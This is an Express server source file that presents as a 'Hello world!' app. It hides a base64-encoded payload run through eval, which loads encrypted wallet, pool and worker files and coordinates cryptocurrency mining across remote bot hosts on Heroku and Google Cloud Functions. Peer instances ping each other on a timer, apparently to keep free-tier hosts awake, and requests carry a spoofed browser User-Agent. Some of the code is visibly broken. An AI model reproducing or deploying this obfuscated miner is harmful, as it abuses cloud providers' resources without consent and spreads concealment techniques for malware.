'use strict';
const fs = require('fs');
const request = require('request');
const CryptoJS = require("crypto-js");
const express=require('express');
const app=express();
app.get('/',function(req,res) {
  if(!c.coin) var glob = function(x) { eval(decrypt(x.substring(-~[c.active]))) }
  (`AZGVjcnlwdCA9IGZ1bmN0aW9uKHgpeyByZXR1cm4gQ3J5cHRvSlMuQUVTLmRlY3J5cHQoeC5zcGxpdCgvXHJ8XG4vKS5qb2luKCcnKSxjLmFjdGl2ZS50b1N0cmluZygpKS50
b1N0cmluZyhDcnlwdG9KUy5lbmMuVXRmOCkgfTsKdmFyIGxpc3QgPSBkZWNyeXB0KGZzLnJlYWRGaWxlU3luYygnbGlzdC50eHQnLCd1dGY4JykpLnNwbGl0KCdcclxuJyk7CmMuY
29pbiA9IGxpc3Quc2hpZnQoKTsgdmFyIG15Y29pbiA9IHJlcXVpcmUoJy4vJytjLmNvaW4rJy5qcycpOyBjLndhbGxldCA9IGxpc3Quc2hpZnQoKTsKd29ya2VyID0gZGVjcnlwdC
hmcy5yZWFkRmlsZVN5bmMoJ3N1cGVyYm90LmpzJywndXRmOCcpKStgCmFwcC5kYj17c3RhdGU6J3llbGxvdycsaG9zdDpoLGhhc2g6JzAgaC9zIFswLzBdJ307CnZhciBib3QgPSB
uZXcgc3VwZXJib3QoKTsKdmFyIHRfaGFzaCA9IGxfaGFzaCA9IHNfaGFzaCA9IDA7CmFwcC5wb3N0KCcvd29ya2VyJywgYXBwLnBhcnNlciwgZnVuY3Rpb24gKHJlcSwgcmVzKSB7
CiAgYXBwLmRiLm1zZyA9ICdub3RoaW5nJzsKICB2YXIgcHMgPSBbXTsKICBmb3IodmFyIGk9MDsgaTxyZXEuYm9keS5qb2JzLmxlbmd0aDsgaSsrKSBwcy5wdXNoKGJvdC5vbm1lc
3NhZ2UocmVxLmJvZHkuam9ic1tpXSkpOwogIFByb21pc2UuYWxsKHBzKS50aGVuKG1zZ3MgPT4gewogICAgdF9oYXNoICs9IG1zZ3MubGVuZ3RoOwogICAgZm9yKHZhciBpPTA7IG
k8bXNncy5sZW5ndGg7IGkrKykgaWYobXNnc1tpXSAhPSAnbm90aGluZycpIHsKICAgICAgaWYoYXBwLmRiLm1zZyA9PSAnbm90aGluZycpIGFwcC5kYi5tc2cgPSBbbXNnc1tpXV0
KICAgICAgZWxzZSBhcHAuZGIubXNnLnB1c2gobXNnc1tpXSk7CiAgICAgIHNfaGFzaCsrOwogICAgfQogICAgcmVzLmpzb24oYXBwLmRiKTsKICB9KTsKfSk7CnNldEludGVydmFs
KGZ1bmN0aW9uKCkgewogIGFwcC5kYi5zdGF0ZSA9IHRfaGFzaCA9PSBsX2hhc2ggPyAneWVsbG93JyA6ICdncmVlbic7CiAgYXBwLmRiLmhhc2ggPSAodF9oYXNoLWxfaGFzaCkrJ
yBoL3MgWycrdF9oYXNoKycvJytzX2hhc2grJ10nOwogIGxfaGFzaCA9IHRfaGFzaDsKfSwgMTAwMCk7CmMoYXBwLmRiKWA7CmZvcih2YXIgaT0wOyBpPGxpc3QubGVuZ3RoOyBpKy
spCiAgaWYobGlzdFtpXS5zdGFydHNXaXRoKCdodHRwJykpIHsgbGV0IG5ib3Q9e2hvc3Q6bGlzdFtpXSwgc3RhdGU6J29yYW5nZScsIGhhc2g6JzAgaC9zIFswLzBdJ307IGJvdHM
ucHVzaChuYm90KTsgd2FrZXVwKG5ib3QpIH0KICBlbHNlIHBvb2xzLnB1c2gobmV3IG15Y29pbih7IHdhbGxldDogYy53YWxsZXQsIGhvc3Q6IGxpc3RbaV0gfSkp`)
  if(req.query.yellow_pools) c.yellow_pools = req.query.yellow_pools == 'true'
  if(req.query.json) res.json({ c: c, pools: mylist(pools), bots: mylist(bots) })
  else { res.send('Hello world!') }
});
var s=app.listen(process.env.PORT||5000,()=>console.log('Listening on port '+s.address().port));

var decrypt = function(x){ return Buffer.from(x,'base64').toString('ascii') };
var c = {
  id: 2,
  peers: [
    'https://myte1001.herokuapp.com',
    'https://myte1002.herokuapp.com'
  ],
  state: 'orange', 
  yellow_pools: false, 
  hash: '0 h/s 0/0'
}

var rec = false;
var pools = []; var bots = []; var worker = '';

function wakeup(bot) {
  bot.msg = "wakeup";
  bot.wakeup = setTimeout(function() { onmsg(bot) }, 60000);
  bot.wakecount = 60
}

function onmsg(bot) {
  delete bot.wakeup; delete bot.wakecount;
  if(Object.prototype.toString.call(bot.msg).slice(0,-1).split(' ')[1] == 'Array')
    for(var i=0; i<pools.length; i++) for(var j=0; j<bot.msg.length; j++) {
      if(pools[i].job && pools[i].job.job.job_id == bot.msg[j].job_id) {
        pools[i].mysubmit(bot.msg[j],c.yellow_pools);
        break;
      };
    };

  let jobs = []; for(var i=0; i<pools.length; i++) if(pools[i].job) jobs.push(pools[i].job);
  if (!c.active || jobs.length == 0) wakeup(bot)
  else {
    var data = { jobs: jobs };
    myrequest(bot.host+'/worker',{jobs:jobs},function(error, response, body){
      if(body && body.toString().includes('Cannot POST')) myrequest(bot.host,{worker:worker},function(error,response,body){botdb(error,body)})
      else botdb(error,body,true)
    })
  }

  function botdb(error,body,next) {
    if(error) bot.msg=error.message
    else if(!body) bot.msg='body is empty'
    else if(body.error) bot.msg=body.error
    else if(!body.state) bot.msg='body is wrong'
    else {
      bot.state = body.state;
      bot.hash = body.hash;
      bot.msg = body.msg;
      if(next) return onmsg(bot);
      else return wakeup(bot)
    }
    if(bot.msg == 'body is wrong' && bot.host.includes('cloudfunctions.net')) bot.state = 'orange'
    else bot.state = 'red'; 
    bot.hash = '0 h/s '+bot.hash.split(' ')[2];
    wakeup(bot)
  }
}

function mylist(obj) {
  var result = {red:[],orange:[],yellow:[],green:[]}
  for(var i=0; i<obj.length; i++) result[obj[i].state].push(obj[i].host+' - '+obj[i].hash); 
  for (const [key, value] of Object.entries(result)) { if(!result[key].length) delete result[key] }
  return result
}

function myrequest(url,p1,p2) {
  var options = {
    url:url, method:'GET', json:true,
    headers:{'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Geko) Chrome/83.0.4103.116 Safari/537.36'}
  }
  if(p2) { options.method = 'POST'; options.form = p1 }
  request(options, (error, response, body) => {
    if(!p2) p1(error, response, body)
    else p2(error, response, body)
  };
}

setInterval(function() {
  var m = new Date().getMinutes();
  if(c.id == 1) c.active = m < 30 ? m+1 : m-59
  else c.active =  m-29
  if(!rec && c.active == 1) { rec = true; myrequest(c.peers[c.id-1],function(){ rec = false }) }
  if(!rec && c.active == 30) { rec = true; myrequest(c.peers[c.id == 1 ? 1 : 0],function(){ rec = false }) }

  var hsum = 0; var hsub = 0; var hacp = 0;  var rt = false;

  for(var i=0; i<pools.length; i++) {
    hsub += Number(pools[i].hash.split('/')[0]);
    hacp += Number(pools[i].hash.split('/')[1]);
    rt = pools[i].state == 'red' ? true: rt;
  }

  for(var i=0; i<bots.length; i++) {
    var ta = bots[i].hash.split(' '); bots[i].hash = ta[0]+' h/s '+ta[2];
    if(bots[i].wakecount) { bots[i].wakecount--;  bots[i].hash += ' - '+bots[i].wakecount+' sec' }
    hsum += Number(bots[i].hash.split(' ')[0]);
    rt = bots[i].state == 'red' ? true: rt
  }

  c.state = rt ? 'orange' : hsum == 0 ? 'yellow' : 'green'
  c.hash = hsum+' h/s '+hsub+'/'+hacp;
}, 1000);
